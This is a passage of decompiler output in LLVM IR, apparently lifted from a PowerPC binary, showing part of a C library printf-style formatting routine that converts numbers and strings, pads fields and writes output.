dec_label_pc_1000e56c:                            ; preds = %dec_label_pc_1000e564
  %v3_1000e56c = icmp eq i32 %v0_1000e564, 3
  br i1 %v3_1000e56c, label %dec_label_pc_1000e574, label %dec_label_pc_1000e57c

dec_label_pc_1000e574:                            ; preds = %dec_label_pc_1000e56c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e590

dec_label_pc_1000e57c:                            ; preds = %dec_label_pc_1000e56c
  %v3_1000e57c = icmp eq i32 %v0_1000e564, 1
  br i1 %v3_1000e57c, label %dec_label_pc_1000e594, label %dec_label_pc_1000e590

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e564
  %v0_1000e58c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000e58c = sub i32 0, %v0_1000e58c
  store i32 %v1_1000e58c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e590

dec_label_pc_1000e590:                            ; preds = %dec_label_pc_1000e57c, %dec_label_pc_1000e574, %dec_label_pc_1000e58c
  br label %dec_label_pc_1000e594

dec_label_pc_1000e594:                            ; preds = %dec_label_pc_1000e57c, %dec_label_pc_1000e590
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000e590 ], [ 6, %dec_label_pc_1000e57c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000e594 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e594, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000e594, -1
  br i1 %tmp75, label %dec_label_pc_1000e5a8, label %dec_label_pc_1000e5a4

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e594
  br label %dec_label_pc_1000e5a8

dec_label_pc_1000e5a8:                            ; preds = %dec_label_pc_1000e594, %dec_label_pc_1000e5a4
  %storemerge = phi i32 [ %v4_1000e5a4, %dec_label_pc_1000e5a4 ], [ 32, %dec_label_pc_1000e594 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000e5a8 = icmp eq i32 %v0_1000e564, 1
  br i1 %v3_1000e5a8, label %dec_label_pc_1000e5c4, label %dec_label_pc_1000e5b4

dec_label_pc_1000e5b4:                            ; preds = %dec_label_pc_1000e5a8
  %v0_1000e5b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e5b4 = mul i32 %v0_1000e5b4, 4
  store i32 %v1_1000e5b4, i32* %r0.global-to-local, align 4
  %v0_1000e5b8 = load i32, i32* @r1, align 4
  %v2_1000e5b8 = add i32 %v0_1000e5b8, %v1_1000e5b4
  %v1_1000e5bc = add i32 %v2_1000e5b8, 188
  %v2_1000e5bc = inttoptr i32 %v1_1000e5bc to i32*
  %v3_1000e5bc = load i32, i32* %v2_1000e5bc, align 4
  store i32 %v3_1000e5bc, i32* %r0.global-to-local, align 4
  %v1_1000e5c0 = call i32 @__asm_rlwinm(i32 %v3_1000e5bc, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000e5c4

dec_label_pc_1000e5c4:                            ; preds = %dec_label_pc_1000e5a8, %dec_label_pc_1000e5b4
  %v3_1000e5c4 = load i32, i32* %stack_var_-344, align 4
  %v0_1000e5c8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e5c8, i32* @r5, align 4
  %v2_1000e5cc = inttoptr i32 %v0_1000e5c8 to i32*
  %v3_1000e5cc = call i32 @_load_inttype(i32 %v3_1000e5c4, i32* %v2_1000e5cc)
  store i32 %v0_1000e5c8, i32* %r7.global-to-local, align 4
  %v0_1000e5dc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000e5dc, i32* %r8.global-to-local, align 4
  %v6_1000e5e4 = call i32 @_uintmaxtostr(i8* %v5_1000e5e4, i32 %v3_1000e5cc, i32 %v3_1000e5c4, i32 %v0_1000e5c8, i32 %v0_1000e5dc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000e5e4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000e638, label %dec_label_pc_1000e5f8

dec_label_pc_1000e5f8:                            ; preds = %dec_label_pc_1000e5c4
  %v7_1000e5e4 = inttoptr i32 %v6_1000e5e4 to i8*
  %v3_1000e5f8 = load i8, i8* %v7_1000e5e4, align 1
  %v4_1000e5f8 = zext i8 %v3_1000e5f8 to i32
  store i32 %v4_1000e5f8, i32* %r0.global-to-local, align 4
  %v3_1000e600 = icmp eq i8 %v3_1000e5f8, 45
  br i1 %v3_1000e600, label %dec_label_pc_1000e608, label %dec_label_pc_1000e61c

dec_label_pc_1000e608:                            ; preds = %dec_label_pc_1000e5f8
  %v1_1000e608 = or i32 %v0_1000e62c, 2
  store i32 %v1_1000e608, i32* %r0.global-to-local, align 4
  %v2_1000e60c = add i32 %v6_1000e5e4, 1
  store i32 %v2_1000e60c, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000e638

dec_label_pc_1000e61c:                            ; preds = %dec_label_pc_1000e5f8
  %v1_1000e61c = and i32 %v0_1000e62c, 2
  store i32 %v1_1000e61c, i32* %r0.global-to-local, align 4
  %v3_1000e61c = icmp eq i32 %v1_1000e61c, 0
  br i1 %v3_1000e61c, label %dec_label_pc_1000e62c, label %dec_label_pc_1000e624

dec_label_pc_1000e624:                            ; preds = %dec_label_pc_1000e61c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000e638

dec_label_pc_1000e62c:                            ; preds = %dec_label_pc_1000e61c
  %v1_1000e62c = urem i32 %v0_1000e62c, 2
  store i32 %v1_1000e62c, i32* %r11.global-to-local, align 4
  %v3_1000e62c = icmp eq i32 %v1_1000e62c, 0
  br i1 %v3_1000e62c, label %dec_label_pc_1000e638, label %dec_label_pc_1000e634

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e62c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000e638

dec_label_pc_1000e638:                            ; preds = %dec_label_pc_1000e62c, %dec_label_pc_1000e5c4, %dec_label_pc_1000e624, %dec_label_pc_1000e608, %dec_label_pc_1000e634
  %v0_1000e6a4 = phi i32 [ %v6_1000e5e4, %dec_label_pc_1000e5c4 ], [ %v2_1000e60c, %dec_label_pc_1000e608 ], [ %v6_1000e5e4, %dec_label_pc_1000e62c ], [ %v6_1000e5e4, %dec_label_pc_1000e634 ], [ %v6_1000e5e4, %dec_label_pc_1000e624 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000e62c, %dec_label_pc_1000e5c4 ], [ %v1_1000e608, %dec_label_pc_1000e608 ], [ %v0_1000e62c, %dec_label_pc_1000e62c ], [ %v0_1000e62c, %dec_label_pc_1000e634 ], [ %v0_1000e62c, %dec_label_pc_1000e624 ]
  %v3_1000e638 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000e84c, i32* %r0.global-to-local, align 4
  %v2_1000e640 = sub i32 %v2_1000e84c, %v0_1000e6a4
  %v1_1000e648 = add i32 %v2_1000e640, 127
  store i32 %v1_1000e648, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000e638, -1
  br i1 %tmp76, label %dec_label_pc_1000e654, label %dec_label_pc_1000e650

dec_label_pc_1000e650:                            ; preds = %dec_label_pc_1000e638
  br label %dec_label_pc_1000e654

dec_label_pc_1000e654:                            ; preds = %dec_label_pc_1000e638, %dec_label_pc_1000e650
  %v0_1000e688 = phi i32 [ %v3_1000e638, %dec_label_pc_1000e638 ], [ 1, %dec_label_pc_1000e650 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000e658 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000e658, i32* %r11.global-to-local, align 4
  %v3_1000e658 = icmp eq i32 %v1_1000e658, 0
  br i1 %v3_1000e658, label %dec_label_pc_1000e6a4, label %dec_label_pc_1000e660

dec_label_pc_1000e660:                            ; preds = %dec_label_pc_1000e654
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000e664, label %dec_label_pc_1000e670, label %dec_label_pc_1000e680.thread

dec_label_pc_1000e680.thread:                     ; preds = %dec_label_pc_1000e660
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000e6a4

dec_label_pc_1000e670:                            ; preds = %dec_label_pc_1000e660
  br i1 %v3_1000e670, label %dec_label_pc_1000e678, label %dec_label_pc_1000e680

dec_label_pc_1000e678:                            ; preds = %dec_label_pc_1000e670
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000e6a4

dec_label_pc_1000e680:                            ; preds = %dec_label_pc_1000e670
  br i1 %v3_1000e680, label %dec_label_pc_1000e688, label %dec_label_pc_1000e6a4

dec_label_pc_1000e688:                            ; preds = %dec_label_pc_1000e680
  %v3_1000e688 = icmp ugt i32 %v0_1000e688, %v1_1000e648
  br i1 %v3_1000e688, label %dec_label_pc_1000e6a4, label %dec_label_pc_1000e690

dec_label_pc_1000e690:                            ; preds = %dec_label_pc_1000e688
  %v1_1000e690 = inttoptr i32 %v0_1000e6a4 to i8*
  %v2_1000e690 = load i8, i8* %v1_1000e690, align 1
  %v3_1000e690 = zext i8 %v2_1000e690 to i32
  store i32 %v3_1000e690, i32* %r0.global-to-local, align 4
  %v3_1000e698 = icmp eq i8 %v2_1000e690, 48
  br i1 %v3_1000e698, label %dec_label_pc_1000e6a4, label %dec_label_pc_1000e6a0

dec_label_pc_1000e6a0:                            ; preds = %dec_label_pc_1000e690
  %v1_1000e6a0 = add i32 %v2_1000e640, 128
  br label %dec_label_pc_1000e6a4

dec_label_pc_1000e6a4:                            ; preds = %dec_label_pc_1000e680.thread, %dec_label_pc_1000e680, %dec_label_pc_1000e690, %dec_label_pc_1000e688, %dec_label_pc_1000e654, %dec_label_pc_1000e678, %dec_label_pc_1000e6a0
  %v1_1000e6ec = phi i32 [ %v0_1000e688, %dec_label_pc_1000e680 ], [ 1, %dec_label_pc_1000e690 ], [ %v0_1000e688, %dec_label_pc_1000e688 ], [ %v0_1000e688, %dec_label_pc_1000e654 ], [ %v0_1000e688, %dec_label_pc_1000e678 ], [ %v1_1000e6a0, %dec_label_pc_1000e6a0 ], [ %v0_1000e688, %dec_label_pc_1000e680.thread ]
  %v1_1000e6a4 = inttoptr i32 %v0_1000e6a4 to i8*
  %v2_1000e6a4 = load i8, i8* %v1_1000e6a4, align 1
  %v3_1000e6a4 = zext i8 %v2_1000e6a4 to i32
  store i32 %v3_1000e6a4, i32* %r0.global-to-local, align 4
  %v3_1000e6a8 = icmp eq i8 %v2_1000e6a4, 48
  br i1 %v3_1000e6a8, label %dec_label_pc_1000e6b0, label %dec_label_pc_1000e6e8

dec_label_pc_1000e6b0:                            ; preds = %dec_label_pc_1000e6a4
  %v0_1000e6b0 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000e6b0, 6
  br i1 %tmp77, label %dec_label_pc_1000e6bc, label %dec_label_pc_1000e6b8

dec_label_pc_1000e6b8:                            ; preds = %dec_label_pc_1000e6b0
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e6b0, %dec_label_pc_1000e6b8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e6c0, label %dec_label_pc_1000e6c8, label %dec_label_pc_1000e6d8

dec_label_pc_1000e6c8:                            ; preds = %dec_label_pc_1000e6bc
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001b284.1046 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e864

dec_label_pc_1000e6d8:                            ; preds = %dec_label_pc_1000e6bc
  %v3_1000e6d8 = icmp eq i32 %v1_1000e6ec, 0
  br i1 %v3_1000e6d8, label %dec_label_pc_1000e6e0, label %dec_label_pc_1000e6e8

dec_label_pc_1000e6e0:                            ; preds = %dec_label_pc_1000e6d8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e864

dec_label_pc_1000e6e8:                            ; preds = %dec_label_pc_1000e6d8, %dec_label_pc_1000e6a4
  %v3_1000e6e8 = icmp ugt i32 %v1_1000e6ec, %v1_1000e648
  %v2_1000e6ec = sub i32 %v1_1000e6ec, %v1_1000e648
  store i32 %v2_1000e6ec, i32* %r29.global-to-local, align 4
  br i1 %v3_1000e6e8, label %dec_label_pc_1000e884thread-pre-split, label %dec_label_pc_1000e864

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e518
  br i1 %v2_1000e6f8, label %dec_label_pc_1000e72c, label %dec_label_pc_1000e700

dec_label_pc_1000e700:                            ; preds = %dec_label_pc_1000e6f8
  %v3_1000e700 = load i32, i32* %stack_var_-344, align 4
  %v0_1000e70c = load i32, i32* %r24.global-to-local, align 4
  store i32 268494620, i32* @lr, align 4
  %v5_1000e718 = call i32 @_fpmaxtostr(i32 %v0_1000e70c, i32* nonnull %stack_var_-196, i32 268493556, i32 %v3_1000e700)
  %v1_1000e71c = icmp slt i32 %v5_1000e718, 0
  br i1 %v1_1000e71c, label %dec_label_pc_1000e9e8, label %dec_label_pc_1000e724

dec_label_pc_1000e724:                            ; preds = %dec_label_pc_1000e700
  %v0_1000e724 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e724 = add i32 %v0_1000e724, %v5_1000e718
  store i32 %v2_1000e724, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000e9d4

dec_label_pc_1000e72c:                            ; preds = %dec_label_pc_1000e6f8
  br i1 %v2_1000e72c, label %dec_label_pc_1000e7d4, label %dec_label_pc_1000e734

dec_label_pc_1000e734:                            ; preds = %dec_label_pc_1000e72c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000e740 = load i32, i32* %stack_var_-344, align 4
  %v1_1000e748 = inttoptr i32 %v3_1000e740 to i32*
  %v2_1000e748 = load i32, i32* %v1_1000e748, align 4
  br i1 %v3_1000e72c, label %dec_label_pc_1000e748, label %dec_label_pc_1000e79c

dec_label_pc_1000e748:                            ; preds = %dec_label_pc_1000e734
  store i32 %v2_1000e748, i32* %r0.global-to-local, align 4
  %v3_1000e74c = icmp eq i32 %v2_1000e748, 0
  store i32 %v2_1000e748, i32* %stack_var_-340, align 4
  br i1 %v3_1000e74c, label %dec_label_pc_1000e86c, label %dec_label_pc_1000e758

dec_label_pc_1000e758:                            ; preds = %dec_label_pc_1000e748
  %v3_1000e758 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e758, i32* %r0.global-to-local, align 4
  %v1_1000e760 = icmp slt i32 %v3_1000e758, 0
  br i1 %v1_1000e760, label %dec_label_pc_1000e76c, label %dec_label_pc_1000e768

dec_label_pc_1000e768:                            ; preds = %dec_label_pc_1000e758
  br label %dec_label_pc_1000e76c

dec_label_pc_1000e76c:                            ; preds = %dec_label_pc_1000e758, %dec_label_pc_1000e768
  %storemerge94 = phi i32 [ %v3_1000e758, %dec_label_pc_1000e768 ], [ -1, %dec_label_pc_1000e758 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000e76c, i32* @r3, align 4
  store i32 %v2_1000e770, i32* @r6, align 4
  store i32 %v2_1000e76c, i32* @r4, align 4
  store i32 268494716, i32* @lr, align 4
  %v0_1000e778 = call i32 @__GI_wcsrtombs()
  %v3_1000e77c = icmp eq i32 %v0_1000e778, -1
  store i32 %v0_1000e778, i32* @r31, align 4
  br i1 %v3_1000e77c, label %dec_label_pc_1000e9e8, label %dec_label_pc_1000e788

dec_label_pc_1000e788:                            ; preds = %dec_label_pc_1000e76c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e884

dec_label_pc_1000e79c:                            ; preds = %dec_label_pc_1000e734
  store i32 %v2_1000e84c, i32* @r28, align 4
  store i32 268494768, i32* @lr, align 4
  %v3_1000e7ac = call i32 @__GI_wcrtomb(i32 %v2_1000e84c, i32 %v2_1000e748, i32 %v2_1000e770)
  %v3_1000e7b0 = icmp eq i32 %v3_1000e7ac, -1
  store i32 %v3_1000e7ac, i32* @r31, align 4
  br i1 %v3_1000e7b0, label %dec_label_pc_1000e9e8, label %dec_label_pc_1000e7bc

dec_label_pc_1000e7bc:                            ; preds = %dec_label_pc_1000e79c
  store i32 %v2_1000e84c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000e7cc = load i32, i32* @r25, align 4
  %v1_1000e7cc = load i32, i32* @r28, align 4
  %v3_1000e7cc = trunc i32 %v0_1000e7cc to i8
  %v4_1000e7cc = add i32 %v1_1000e7cc, %v3_1000e7ac
  %v5_1000e7cc = inttoptr i32 %v4_1000e7cc to i8*
  store i8 %v3_1000e7cc, i8* %v5_1000e7cc, align 1
  %v0_1000e888.pre.pre = load i32, i32* @r31, align 4
  %v1_1000e888.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e884thread-pre-split

dec_label_pc_1000e7d4:                            ; preds = %dec_label_pc_1000e72c
  br i1 %v2_1000e7d4, label %dec_label_pc_1000e840, label %dec_label_pc_1000e7dc

dec_label_pc_1000e7dc:                            ; preds = %dec_label_pc_1000e7d4
  %v3_1000e7e0 = load i32, i32* %stack_var_-344, align 4
  %v1_1000e7e8 = inttoptr i32 %v3_1000e7e0 to i32*
  %v2_1000e7e8 = load i32, i32* %v1_1000e7e8, align 4
  br i1 %v3_1000e7d4, label %dec_label_pc_1000e7e8, label %dec_label_pc_1000e818

dec_label_pc_1000e7e8:                            ; preds = %dec_label_pc_1000e7dc
  store i32 %v2_1000e7e8, i32* %r30.global-to-local, align 4
  %v3_1000e7ec = icmp eq i32 %v2_1000e7e8, 0
  br i1 %v3_1000e7ec, label %dec_label_pc_1000e86c, label %dec_label_pc_1000e7f4

dec_label_pc_1000e7f4:                            ; preds = %dec_label_pc_1000e7e8, %dec_label_pc_1000e848
  %v0_1000e808 = phi i32 [ %v2_1000e7e8, %dec_label_pc_1000e7e8 ], [ %v3_1000e858, %dec_label_pc_1000e848 ]
  %v3_1000e7f4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e7f4, i32* %r0.global-to-local, align 4
  %v1_1000e7fc = icmp slt i32 %v3_1000e7f4, 0
  br i1 %v1_1000e7fc, label %dec_label_pc_1000e808, label %dec_label_pc_1000e804

dec_label_pc_1000e804:                            ; preds = %dec_label_pc_1000e7f4
  br label %dec_label_pc_1000e808

dec_label_pc_1000e808:                            ; preds = %dec_label_pc_1000e7f4, %dec_label_pc_1000e804
  %storemerge95 = phi i32 [ %v3_1000e7f4, %dec_label_pc_1000e804 ], [ -1, %dec_label_pc_1000e7f4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268494864, i32* @lr, align 4
  %v1_1000e80c = inttoptr i32 %v0_1000e808 to i8*
  %v2_1000e80c = call i32 @strnlen(i8* %v1_1000e80c)
  store i32 %v2_1000e80c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e878

dec_label_pc_1000e818:                            ; preds = %dec_label_pc_1000e7dc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000e7e8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000e84c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e884thread-pre-split

dec_label_pc_1000e840:                            ; preds = %dec_label_pc_1000e7d4
  br i1 %v3_1000e840, label %dec_label_pc_1000e848, label %dec_label_pc_1000e9e8

dec_label_pc_1000e848:                            ; preds = %dec_label_pc_1000e840
  %v0_1000e848 = call i32 @__errno_location()
  %v1_1000e850 = inttoptr i32 %v0_1000e848 to i32*
  %v2_1000e850 = load i32, i32* %v1_1000e850, align 4
  store i32 %v2_1000e850, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268494940, i32* @lr, align 4
  %v3_1000e858 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000e850, i32 %v2_1000e84c, i32 128)
  store i32 %v3_1000e858, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e7f4

dec_label_pc_1000e864:                            ; preds = %dec_label_pc_1000e6e8, %dec_label_pc_1000e6e0, %dec_label_pc_1000e6c8
  %v0_1000e888.pre41 = phi i32 [ %v1_1000e648, %dec_label_pc_1000e6e8 ], [ 0, %dec_label_pc_1000e6e0 ], [ 5, %dec_label_pc_1000e6c8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e884thread-pre-split

dec_label_pc_1000e86c:                            ; preds = %dec_label_pc_1000e7e8, %dec_label_pc_1000e748
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001b28c.1047 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e878

dec_label_pc_1000e878:                            ; preds = %dec_label_pc_1000e808, %dec_label_pc_1000e86c
  %v0_1000e88829 = phi i32 [ %v2_1000e80c, %dec_label_pc_1000e808 ], [ 6, %dec_label_pc_1000e86c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000e884

dec_label_pc_1000e884thread-pre-split:            ; preds = %dec_label_pc_1000e7bc, %dec_label_pc_1000e818, %dec_label_pc_1000e864, %dec_label_pc_1000e6e8
  %v1_1000e888.pre = phi i32 [ %v2_1000e6ec, %dec_label_pc_1000e6e8 ], [ 0, %dec_label_pc_1000e864 ], [ %v1_1000e888.pre.pre, %dec_label_pc_1000e7bc ], [ 0, %dec_label_pc_1000e818 ]
  %v0_1000e888.pre = phi i32 [ %v1_1000e648, %dec_label_pc_1000e6e8 ], [ %v0_1000e888.pre41, %dec_label_pc_1000e864 ], [ %v0_1000e888.pre.pre, %dec_label_pc_1000e7bc ], [ 1, %dec_label_pc_1000e818 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000e6e8 ], [ %stack_var_-184.0, %dec_label_pc_1000e864 ], [ %v0_1000e62c, %dec_label_pc_1000e7bc ], [ %v0_1000e62c, %dec_label_pc_1000e818 ]
  %v0_1000e884.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000e884

dec_label_pc_1000e884:                            ; preds = %dec_label_pc_1000e884thread-pre-split, %dec_label_pc_1000e788, %dec_label_pc_1000e878
  %v1_1000e888 = phi i32 [ %v1_1000e888.pre, %dec_label_pc_1000e884thread-pre-split ], [ 0, %dec_label_pc_1000e788 ], [ 0, %dec_label_pc_1000e878 ]
  %v0_1000e888 = phi i32 [ %v0_1000e888.pre, %dec_label_pc_1000e884thread-pre-split ], [ %v0_1000e778, %dec_label_pc_1000e788 ], [ %v0_1000e88829, %dec_label_pc_1000e878 ]
  %v0_1000e890 = phi i32 [ %v0_1000e884.pr, %dec_label_pc_1000e884thread-pre-split ], [ 11, %dec_label_pc_1000e788 ], [ 11, %dec_label_pc_1000e878 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000e884thread-pre-split ], [ %v0_1000e62c, %dec_label_pc_1000e788 ], [ %v0_1000e62c, %dec_label_pc_1000e878 ]
  %v3_1000e884 = icmp eq i32 %v0_1000e890, 11
  %v2_1000e888 = add i32 %v0_1000e888, %v1_1000e888
  store i32 %v2_1000e888, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e884, label %dec_label_pc_1000e8a4, label %dec_label_pc_1000e890

dec_label_pc_1000e890:                            ; preds = %dec_label_pc_1000e884
  %v0_1000e894 = call i32 @__asm_mfcr()
  %v1_1000e898 = call i32 @__asm_rlwinm(i32 %v0_1000e894, i32 30, i32 31, i32 31)
  %v1_1000e89c = add i32 %v1_1000e898, 1
  %v0_1000e8a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000e8a0 = add i32 %v0_1000e8a0, %v1_1000e89c
  store i32 %v2_1000e8a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e8a4

dec_label_pc_1000e8a4:                            ; preds = %dec_label_pc_1000e884, %dec_label_pc_1000e890
  %v0_1000e8bc = phi i32 [ %v2_1000e888, %dec_label_pc_1000e884 ], [ %v2_1000e8a0, %dec_label_pc_1000e890 ]
  %v3_1000e8ac = icmp ugt i32 %tmp, %v0_1000e8bc
  br i1 %v3_1000e8ac, label %dec_label_pc_1000e8b4, label %dec_label_pc_1000e8b8

dec_label_pc_1000e8b4:                            ; preds = %dec_label_pc_1000e8a4
  %v2_1000e8b4 = sub i32 %tmp, %v0_1000e8bc
  br label %dec_label_pc_1000e8b8

dec_label_pc_1000e8b8:                            ; preds = %dec_label_pc_1000e8a4, %dec_label_pc_1000e8b4
  %storemerge93 = phi i32 [ %v2_1000e8b4, %dec_label_pc_1000e8b4 ], [ 0, %dec_label_pc_1000e8a4 ]
  %v1_1000e8c8 = phi i32 [ %v2_1000e8b4, %dec_label_pc_1000e8b4 ], [ 0, %dec_label_pc_1000e8a4 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000e8b8 = load i32, i32* @r26, align 4
  %v3_1000e8b8 = icmp eq i32 %v0_1000e8b8, 48
  %v2_1000e8bc = add i32 %v1_1000e8c8, %v0_1000e8bc
  store i32 %v2_1000e8bc, i32* %r0.global-to-local, align 4
  %v0_1000e8c0 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e8c0 = add i32 %v0_1000e8c0, %v2_1000e8bc
  store i32 %v2_1000e8c0, i32* %r23.global-to-local, align 4
  br i1 %v3_1000e8b8, label %dec_label_pc_1000e8c8, label %dec_label_pc_1000e8d0

dec_label_pc_1000e8c8:                            ; preds = %dec_label_pc_1000e8b8
  %v0_1000e8c8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000e8c8 = add i32 %v0_1000e8c8, %v1_1000e8c8
  store i32 %v2_1000e8c8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e8d0

dec_label_pc_1000e8d0:                            ; preds = %dec_label_pc_1000e8b8, %dec_label_pc_1000e8c8
  %v0_1000e8e4 = phi i32 [ %v1_1000e8c8, %dec_label_pc_1000e8b8 ], [ 0, %dec_label_pc_1000e8c8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000e8d4 = and i32 %stack_var_-184.1, 8
  %v3_1000e8d4 = icmp eq i32 %v1_1000e8d4, 0
  br i1 %v3_1000e8d4, label %dec_label_pc_1000e8dc, label %dec_label_pc_1000e8f8

dec_label_pc_1000e8dc:                            ; preds = %dec_label_pc_1000e8d0
  %v0_1000e8dc = load i32, i32* %r24.global-to-local, align 4
  store i32 268495084, i32* @lr, align 4
  %v4_1000e8e8 = call i32 @_charpad(i32 %v0_1000e8dc, i8 32, i32 %v0_1000e8e4)
  %v1_1000e8ec = load i32, i32* @r28, align 4
  %v4_1000e8ec = icmp eq i32 %v4_1000e8e8, %v1_1000e8ec
  br i1 %v4_1000e8ec, label %dec_label_pc_1000e8f4, label %dec_label_pc_1000e9e8

dec_label_pc_1000e8f4:                            ; preds = %dec_label_pc_1000e8dc
  br label %dec_label_pc_1000e8f8

dec_label_pc_1000e8f8:                            ; preds = %dec_label_pc_1000e8d0, %dec_label_pc_1000e8f4
  %v0_1000e8fc = load i32, i32* %r24.global-to-local, align 4
  %v0_1000e904 = load i32, i32* @r27, align 4
  %v2_1000e904 = add i32 %v0_1000e904, ptrtoint (i32* @global_var_1001b294.1048 to i32)
  store i32 268495116, i32* @lr, align 4
  %v2_1000e908 = call i32 @__GI_fputs_unlocked(i32 %v2_1000e904, i32 %v0_1000e8fc)
  %v0_1000e914 = load i32, i32* @r29, align 4
  store i32 268495132, i32* @lr, align 4
  %v4_1000e918 = call i32 @_charpad(i32 %v0_1000e8fc, i8 48, i32 %v0_1000e914)
  %v1_1000e91c = load i32, i32* @r29, align 4
  %v4_1000e91c = icmp eq i32 %v4_1000e918, %v1_1000e91c
  br i1 %v4_1000e91c, label %dec_label_pc_1000e924, label %dec_label_pc_1000e9e8

dec_label_pc_1000e924:                            ; preds = %dec_label_pc_1000e8f8
  %v3_1000e924 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000e924, i32* %r0.global-to-local, align 4
  %v3_1000e928 = icmp eq i32 %v3_1000e924, 0
  br i1 %v3_1000e928, label %dec_label_pc_1000e930, label %dec_label_pc_1000e958

dec_label_pc_1000e930:                            ; preds = %dec_label_pc_1000e924
  %v0_1000e930 = load i32, i32* @r31, align 4
  %v3_1000e930 = icmp eq i32 %v0_1000e930, 0
  br i1 %v3_1000e930, label %dec_label_pc_1000e94c.thread, label %dec_label_pc_1000e94c

dec_label_pc_1000e94c.thread:                     ; preds = %dec_label_pc_1000e930
  br label %dec_label_pc_1000e9bc

dec_label_pc_1000e94c:                            ; preds = %dec_label_pc_1000e930
  %v0_1000e93c = load i32, i32* @r30, align 4
  %v0_1000e944 = load i32, i32* %r24.global-to-local, align 4
  store i32 268495180, i32* @lr, align 4
  %v4_1000e948 = inttoptr i32 %v0_1000e944 to i16*
  %v5_1000e948 = call i32 @__stdio_fwrite(i32 %v0_1000e93c, i32 %v0_1000e930, i16* %v4_1000e948)
  %v1_1000e94c.pre = load i32, i32* @r31, align 4
  %v4_1000e94c = icmp eq i32 %v5_1000e948, %v1_1000e94c.pre
  br i1 %v4_1000e94c, label %dec_label_pc_1000e9bc, label %dec_label_pc_1000e9e8

